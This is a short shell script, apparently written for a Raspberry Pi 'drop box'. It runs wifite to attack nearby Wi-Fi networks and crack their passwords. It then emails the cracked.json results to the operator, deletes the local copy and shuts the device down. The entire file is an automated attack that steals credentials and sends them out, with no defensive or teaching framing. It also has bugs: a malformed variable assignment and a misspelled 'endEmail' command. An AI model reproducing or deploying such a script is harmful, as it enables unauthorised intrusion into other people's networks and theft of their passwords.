#!/usr/bin/sh
sleep 30s
wifite -p 60 --kill
wifite --cracked
systemctl start postfix
sleep 30S
my_address = username@email.com
if [ -f "cracked.json" ]
then
    sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
    rm cracked.json
else
    endEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
fi
sleep 30s
systemctl stop postfix
shutdown now